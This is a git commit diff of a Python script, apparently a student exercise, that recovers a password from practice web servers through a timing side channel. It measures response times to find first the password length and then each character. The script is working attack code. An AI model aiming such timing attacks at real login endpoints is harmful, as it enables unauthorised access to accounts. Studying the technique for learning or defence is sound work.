e12548975326b5ad1911d3dc1af5b0eca55d2a6e
Agam <agamyafe10@gmail.com>
2020-11-28 13:05:51 +0200

    main.py

--- main.py
+++ main.py
@@ -16,135 +16,115 @@ def timeit(url2check, repeat=1):
     return tt
 
 
-def find_pass_len(url, MAX_LEN):
-    time_values = []
-    for num in range(1, MAX_LEN+1, 1):
-        executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
-        time_values.append(min(timeit(executed_url, 20)))# add the time it took to the current password
-        print(f'checking length: {num} the time it took: {time_values[-1]}')
-    average = sum(time_values) / len(time_values)
-    standart_devitation = stdev(time_values)
-    for time_value in time_values:
-        if time_value - min(time_values) > standart_devitation * 1.5:
-            print(f'the length:{time_values.index(time_value)}')
-            return time_values.index(time_value)
+# def find_pass_len(url, MAX_LEN):
+#     time_values = []
+#     for num in range(1, MAX_LEN+1, 1):
+#         executed_url = url + '/' + ("").ljust(num, '*')# defining the password to sent
+#         time_values.append(min(timeit(executed_url, 20)))# add the time it took to the current password
+#         print(f'checking length: {num} the time it took: {time_values[-1]}')
+#     average = sum(time_values) / len(time_values)
+#     standart_devitation = stdev(time_values)
+#     for time_value in time_values:
+#         if time_value - min(time_values) > standart_devitation * 1.5:
+#             print(f'the length:{time_values.index(time_value)}')
+#             return time_values.index(time_value)
 
-def find_tav1():
-    POOL = 'A1IHiy24U3uV'
-    time_values = []
+
+def find_tav(temp_pass):
+    POOL = 'f43adgnertm'
+    time_values = []# the list of al the characters' times' values
+    
     for tav in POOL:
         pass_checked = temp_pass + tav
         executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
         time_values.append(min(timeit(executed_url, 10)))
         print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
-    min_time = max(time_values)
-    min_tav = POOL[time_values.index(min_time)]
-    print(f'part password found: {temp_pass + min_tav} with min time: {min_time}')
-    return min_tav
+    
+    # calculate the statistics for finding the correct lowest time
+    average = sum(time_values) / len(time_values)
+    print(f' the average is:{average}')
+    standart_deviation = stdev(time_values)
+    print(f'the std is : {standart_deviation}')
+    
+    pool_start_length = len(POOL)
+    for time in time_values:
+        if abs(time - average) > 0.8 * standart_deviation:
+            print(f'the password {temp_pass + POOL[time_values.index(time)]} substraction from std is: {abs(time - average)}')
+            POOL += POOL[time_values.index(time)]
+    
+    if len(POOL) > pool_start_length:
+        POOL = POOL[pool_start_length:]
+    
+    while len(POOL) > 1:
+        
+        pool_start_length = len(POOL)
+        for num in range(pool_start_length):
+            pass_checked = temp_pass + POOL[num]
+            executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
+            current_time = min(timeit(executed_url, 10))
+            print(f'checking password: {pass_checked} time was measured: {current_time}')
+            
+            if abs(current_time - average) > 0.8 * standart_deviation:
+                POOL += POOL[num]
+                print(f'the tav {POOL[num]} is an exception {abs(current_time-average)}')
+        
+        if len(POOL) > pool_start_length:
+            POOL = POOL[pool_start_length:]
+    
+    return POOL
 
 
-def find_tav():
-    POOL = 'A1IHiy24U3uV'
+def find_pass_len(url, MAX_LEN):
+    
     time_values = []
-    possible_mins = []
-    for tav in POOL:
-        pass_checked = temp_pass + tav
-        executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
-        time_values.append(min(timeit(executed_url, 5)))
-        print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
-    #calculate the statistics for finding the correct lowest time
+    possible_lens = [i for i in range(1 ,MAX_LEN + 1 , 1)]
+    start_len_possible_lens = MAX_LEN
+    
+    for length in possible_lens:
+        executed_url = url + "/" + "".ljust(length, '*')
+        time_values.append(min(timeit(executed_url,10)))
+        
+        print(f'checking password: {length} time was measured: {time_values[-1]}')
+        
+        if length > 1:
+            standart_deviation = stdev(time_values)# calculate the stadart deviation
+            average = sum(time_values) / len(time_values)
+            print(f'the average is: {average}; the standart deviation is:{standart_deviation}; the substruction frm the time to the avergae is: {time_values[-1]-average}')
+
+            if time_values[-1] - average > standart_deviation:
+                return len(time_values)-1 
+    
+    # in case nothing was found while the first run   
+    # runs through them all with the standart deviation         
     average = sum(time_values) / len(time_values)
     print(f' the average is:{average}')
     standart_devitation = stdev(time_values)
     print(f'the std is : {standart_devitation}')
-    # POOL = ''
+
     for time in time_values:
-        if time - average > 0.8*standart_devitation:
-            print(f'the password {temp_pass + POOL[time_values.index(time)]} std is: {time - average}')
-            possible_mins.append((time, temp_pass + POOL[time_values.index(time)]))# a tupple of the possible min time and the pass
-            POOL += possible_mins[-1][1][-1]
-    # while len(possible_mins) > 1:
-    #     time_values = []
-    #     possible_mins = []
-    #     for tav in POOL:
-    #         pass_checked = temp_pass + tav
-    #         executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
-    #         time_values.append(min(timeit(executed_url, 5)))
-    #         print(f'checking password: {pass_checked} time was measured: {time_values[-1]}')
-    #     POOL = ''
-    #     for time in time_values:
-    #         if time - average < -0.5 * standart_devitation:
-    #             possible_mins.append((time, temp_pass + POOL[time_values.index(time)]))  # a tupple of the possible min time and the pass
-    #             POOL += possible_mins[-1][1][-1]
 
-    if len(possible_mins) == 0:
-        return POOL[time.index(max(time_values))]
-    while len(possible_mins) > 1:
-        for possible in possible_mins:
-            pass_checked = possible[1]
-            executed_url = url + "/" + pass_checked.ljust(pswd_len, '*')
-            time = min(timeit(executed_url, 5))
-
-            print(f'checking password: {pass_checked} time was measured: {time}')
-            if time - average < 1*standart_devitation:
-                possible_mins.remove(possible)
-    print(f' password part found: {possible_mins[0][1]} which gave the min time: {possible_mins[0][0]} ')
-    return possible_mins[0][1][-1]
-
-
-
-        # if num > 1:
-        #
-        #     standart_devitation = stdev(time_values)
-        #     average = sum(time_values) / len(time_values)  # getting the average from the list
-        #     for curr_time in time_values: # running over the times to checks if there is one which unusual
-        #         if curr_time - average > 1.5 * standart_devitation:
-        #             print(f'the difference is {curr_time - average}')
-        #             return time_values.index(curr_time)
-
-    # standart_devitation = stdev(time_values)# getting the standart_devitation from the list
-    # print(standart_devitation)
-    average = sum(time_values)/len(time_values)# getting the average from the list
-    possible_lens = []
-    # for curr_time in time_values:# running over the times to checks if there is one which unusual
-    #     if curr_time - average > 0.8 * standart_devitation:
-    #         print(f'the difference is {curr_time - average}')
-    #         return time_values.index(curr_time)
-
-     #each time that the legnth is bigger than the right length the response time is raising so we want to return the first time it raised
-
-
-    time_values = []
-    # while len(possible_lens) > 1:
-    #     start_length = len(possible_len)
-    #     for possible_len in possible_lens:
-    #         executed_url = url + '/' + ("").ljust(possible_len, '*')  # defining the password to sent
-    #         curr_time = min(timeit(executed_url, 5))
-    #         if average - curr_time > standart_devitation:
-    #             possible_lens.append(possible_len)
-    #         print(f'checking length: {possible_len} the time it took: {curr_time}')
-    #     possible_lens = possible_lens[start_length:]
-
-
+        if time - average > standart_devitation:
+            print(f'the length: {time_values.index(time) + 1} time: {time} std: {abs(time - average)}')
+            return possible_lens[time_values.index(time)] - 1
 
 
 if __name__ == '__main__':
     GAL_SITE = False
 
     if GAL_SITE:
-        url = r'https://verifyserver.herokuapp.com/index'
-        POOL = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        url = "https://agamhacks.herokuapp.com"
         # POOL_SHORT = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
     else:
-        url = "https://passwordserver.herokuapp.com"
+        url = "https://agamhacks.herokuapp.com"# https://passwordserver.herokuapp.com
 
-        POOL = '0123456789'
+        POOL = 'A1IHiy24U3uV'
 
     pswd_len = 4
 
-
-    temp_pass = ""
-    for num in range(pswd_len):
-        temp_pass = temp_pass + find_tav()
-    print(temp_pass)
+    POOL  = 'A1IHiy24U3uV'# the short pool we are using
+    pass_length = find_pass_len(url, 10)
+    final_pass = ""
+    for num in range(pass_length):
+        final_pass += find_tav(final_pass)
+    print(final_pass)
